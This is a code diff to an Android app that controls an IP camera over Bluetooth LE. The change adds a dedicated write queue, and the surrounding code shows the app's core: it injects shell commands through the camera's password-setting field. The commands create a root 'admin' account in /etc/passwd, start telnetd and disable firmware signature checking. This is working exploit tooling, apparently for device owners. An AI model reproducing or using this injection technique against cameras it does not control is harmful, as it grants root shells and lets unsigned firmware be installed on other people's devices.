@@ -54,6 +54,7 @@ public class IpCamActivity extends Activity {
     private String pincode;
     private ArrayDeque<BluetoothGattCharacteristic> readQ;
     private ArrayDeque<BluetoothGattCharacteristic> writeQ;
+    private ArrayDeque<String> commandQ;
 
     // status
     private boolean connected = false;
@@ -225,6 +226,9 @@ public class IpCamActivity extends Activity {
 		else
 		    setStatus("Unlocking failed - Wrong PIN Code?");
 		break;
+	    case 0xa201:
+		runCommandQueue(val);
+		break;
 	    default:
 		Log.d(msg, "No action defined after writing " + c.getUuid().toString());
 	    }
@@ -286,7 +290,7 @@ public class IpCamActivity extends Activity {
 		public void run() {
 		    TextView t = (TextView) findViewById(R.id.sysstatus);
 		    t.setText("Name: " + kv.get("N") + "\nTime: " + kv.get("T") + "\nFW Ver: " + kv.get("F") + "\nHW Ver: " + kv.get("H") + "\nMyDlink Ver: " + kv.get("V") + "\nMac: " + kv.get("M"));
-			      //		    t.setText(dateFormat.format(new Date(1000 * Integer.parseInt(kv.get("T"))))); // milliseconds....
+		    //		    t.setText(dateFormat.format(new Date(1000 * Integer.parseInt(kv.get("T"))))); // milliseconds....
 		}
 	    });
     }
@@ -348,7 +352,8 @@ public class IpCamActivity extends Activity {
 	// create queues
 	readQ = new ArrayDeque();
 	writeQ = new ArrayDeque();
-	
+	commandQ = new ArrayDeque();
+
 	// reset status to default
 	connected = false;
 	locked = true;
@@ -496,7 +501,7 @@ public class IpCamActivity extends Activity {
     }
 
     public void doTelnet(View view) {
-        runCommand("grep -Eq ^admin: /etc/passwd||echo admin:x:0:0::/:/bin/sh >>/etc/passwd");
+	runCommand("grep -Eq ^admin: /etc/passwd||echo admin:x:0:0::/:/bin/sh >>/etc/passwd");
 	runCommand("grep -Eq ^admin:x: /etc/passwd&&echo admin:" + pincode + "|chpasswd");
         runCommand("pidof telnetd||telnetd");
     }
@@ -509,8 +514,7 @@ public class IpCamActivity extends Activity {
     public void doUnsignedFW(View view) {
 	runCommand("tdb set SecureFW _TrustLevel_byte=0");
     }
-
-
+   
     /*
     private void setWifi(String essid, String passwd) {
 	if (wifiScanResults == null) {
@@ -523,11 +527,36 @@ public class IpCamActivity extends Activity {
     */
     
     private void setInitialPassword() {
-	writeChar(0xa201, "P=;N=" + pincode);
+	queuedSetPassword("P=;N=" + pincode);
+    }
+
+
+    /*
+     * writing a series of values to this characteristic is not the
+     * same as writing the last value only, which is how a
+     * characteristic normally would behave.  So we maintain a dedicated
+     * write queue here.
+     */
+    private void queuedSetPassword(String val) {
+	boolean writenow = commandQ.isEmpty();
+	commandQ.add(val);
+	if (writenow)
+	    writeChar(0xa201, val);
     }
     
     private void runCommand(String command) {
 	setStatus("Running '" + command + "' on camera...");
-	writeChar(0xa201, "P=" + pincode + ";N=" + pincode + "&&(" + command + ")&");
+	queuedSetPassword("P=" + pincode + ";N=" + pincode + "&&(" + command + ")&");
+    }
+
+
+    private void runCommandQueue(String lastwrite) {
+	String first = commandQ.remove();
+	if (first.equals(lastwrite))
+	    Log.d(msg, "Command '" + lastwrite + "' was successfully written");
+	else
+	    Log.d(msg, "'" + lastwrite + "' does not match expected: '" + first+ "'");
+	if (!commandQ.isEmpty())
+	    writeChar(0xa201, commandQ.peekFirst());
     }
 }
